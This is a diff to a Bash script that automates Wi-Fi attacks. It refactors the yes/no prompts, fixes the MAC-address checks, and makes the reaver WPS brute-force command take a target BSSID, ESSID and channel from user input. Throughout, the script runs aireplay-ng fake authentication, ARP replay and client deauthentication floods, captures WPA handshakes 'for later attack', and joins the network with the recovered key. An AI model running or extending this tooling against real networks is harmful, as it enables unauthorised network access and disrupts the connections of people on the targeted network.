@@ -43,6 +43,24 @@ echo
 
 ##############################################################################################################
 
+f_yes_no(){
+local PROMPT=$1
+local ANSWER
+
+while true; do
+    echo -n "$PROMPT (y/n) "
+    read -r ANSWER
+
+    case "$ANSWER" in
+        [Yy]|[Yy][Ee][Ss]) return 0 ;;
+        [Nn]|[Nn][Oo]) return 1 ;;
+        *) echo "Please answer y or n." ;;
+    esac
+done
+}
+
+##############################################################################################################
+
 f_start(){
 f_banner
 
@@ -129,9 +147,7 @@ fi
 if [ -f .editor ]; then
     EDITOR=$(cat .editor)
 else
-    echo "What is your default text editor?" --cancel-label=vi --ok-label=gedit
-
-    if [ $? = 0 ]; then
+    if f_yes_no "Use gedit as your default text editor?"; then
         EDITOR="gedit"
         echo gedit > .editor
     else
@@ -332,7 +348,7 @@ if [ -z "$BSSID" ]; then
 fi
 
 # Check for a valid MAC address
-if f_validMAC ! "$BSSID"; then
+if ! f_validMAC "$BSSID"; then
     printf "Sorry, %s is not a valid MAC address\n" "$BSSID" >&2
     read -p "Press <return> to continue."
     f_crackWEP
@@ -466,7 +482,36 @@ xterm -bg blue -fg white -fn 10x20 -geometry 110x60+0+0 -T WPS -e wash -i "$MONI
 
 f_options
 
-reaver -i "$MONITOR" -b <BSSID> -e <ESSID> -f -c <channel> -a -vv
+echo -n "BSSID:    "
+read -r BSSID
+
+if [ -z "$BSSID" ]; then
+    f_error
+fi
+
+if ! f_validMAC "$BSSID"; then
+    printf "Sorry, %s is not a valid MAC address\n" "$BSSID" >&2
+    read -r -p "Press <return> to continue."
+    f_scanWPS
+fi
+
+echo -n "ESSID:    "
+read -r ESSID
+
+if [ -z "$ESSID" ]; then
+    f_error
+fi
+
+echo -n "Channel:  "
+read -r CHANNEL
+
+if [ -z "$CHANNEL" ]; then
+    f_error
+fi
+
+f_validChannel "$CHANNEL"
+
+reaver -i "$MONITOR" -b "$BSSID" -e "$ESSID" -f -c "$CHANNEL" -a -vv
 }
 
 ##############################################################################################################
@@ -490,9 +535,7 @@ else
     airodump-ng --channel "$CHANNEL" --encrypt WEP "$MONITOR"
 fi
 
-echo "Is the network you want to attack hidden?"
-
-if [ $? = 0 ]; then
+if f_yes_no "Is the network you want to attack hidden?"; then
     A=$(zenity --entry --text "BSSID of target")
     E=$(zenity --entry --text "STATION MAC currently connected")
 
@@ -517,7 +560,7 @@ if [ -z "$STATION" ]; then
 fi
 
 # Check for a valid MAC address
-if f_validMAC ! "$STATION"; then
+if ! f_validMAC "$STATION"; then
     printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
     read -p "Press <return> to continue."
     f_crackWEP
@@ -537,9 +580,7 @@ sleep 5
 xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+335 -hold -T "Fake Authentication" -e aireplay-ng --fakeauth 0 -e "$ESSID" -a "$BSSID" -h "$fakeMAC" "$MONITOR" &
 sleep 20
 
-echo "Has association been successful?"
-
-if [ $? = 1 ]; then
+if ! f_yes_no "Has association been successful?"; then
     echo "MAC address filtering may be enabled."
     killall xterm 2>/dev/null
     f_menu
@@ -548,9 +589,7 @@ fi
 xterm -bg blue -fg white -fn 10x20 -geometry 94x6+965+545 -hold -T "ARP Replay" -e aireplay-ng --arpreplay -b "$BSSID" -h "$fakeMAC" "$MONITOR" &
 sleep 30
 
-echo "Look in the airodump-ng window. Is the value for #Data increasing?"
-
-if [ $? = 1 ]; then
+if ! f_yes_no "Look in the airodump-ng window. Is the value for #Data increasing?"; then
     killall xterm 2>/dev/null
     f_menu
 fi
@@ -586,10 +625,7 @@ f_connect
 
 f_connect(){
 echo
-echo -n "Would you like to connect to the wireless network? y/n  "
-read -r 1 CONNECT
-
-if [ "$CONNECT" == y ]; then
+if f_yes_no "Would you like to connect to the wireless network?"; then
     killall xterm 2>/dev/null
     ifconfig "$INTERFACE" down
     iwconfig "$INTERFACE" essid "$ESSID" key "$KEY"
@@ -624,11 +660,9 @@ else
      airodump-ng --channel "$CHANNEL" --encrypt WPA "$MONITOR"
 fi
 
-echo "Is the network you want to attack hidden (non-broadcasted SSID)?"
-
-if [ $? = 0 ]; then
-    a=$(zenity --entry --text BSSID)
-    e=$(zenity --entry --text STATION)
+if f_yes_no "Is the network you want to attack hidden (non-broadcasted SSID)?"; then
+    A=$(zenity --entry --text BSSID)
+    E=$(zenity --entry --text STATION)
     xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e aireplay-ng -0 10 -a "$A" -c "$E" "$MONITOR" &
 fi
 
@@ -643,7 +677,7 @@ if [ -z "$STATION" ]; then
 fi
 
 # Check for a valid MAC address
-if f_validMAC ! "$STATION"; then
+if ! f_validMAC "$STATION"; then
     printf "Sorry, %s is not a valid MAC address\n" "$STATION" >&2
     read -p "Press <return> to continue."
     f_crackWPA
@@ -655,12 +689,8 @@ sleep 10
 xterm -bg blue -fg white -fn 10x20 -geometry 94x12+965+345 -hold -T "Deauthentication" -e aireplay-ng --deauth 10 -a "$BSSID" -c "$STATION" "$MONITOR" &
 sleep 30
 
-echo "Look in the airodump-ng window. Has a WPA handshake occured? If not, continue to wait. If so, click Yes."
-
-if [ $? = 0 ]; then
-    echo "Would you like to store the capture file containing the handshake for later attack?"
-
-    if [ $? = 0 ]; then
+if f_yes_no "Look in the airodump-ng window. Has a WPA handshake occurred?"; then
+    if f_yes_no "Would you like to store the capture file containing the handshake for later attack?"; then
         killall xterm 2>/dev/null
         FIXEDESSID=$(echo "$ESSID" | sed 's/ /\\ /')
 
@@ -670,9 +700,8 @@ if [ $? = 0 ]; then
 
         cp output* "$WORKDIR/$DATESTAMP/$FIXEDESSID"
         echo "Capture file(s) saved in $WORKDIR/$DATESTAMP/$FIXEDESSID"
-        echo "Would you like to save the capture file(s) to the desktop as well?"
 
-        if [ $? = 0 ]; then
+        if f_yes_no "Would you like to save the capture file(s) to the desktop as well?"; then
             cp output* ~/Desktop
         fi
 
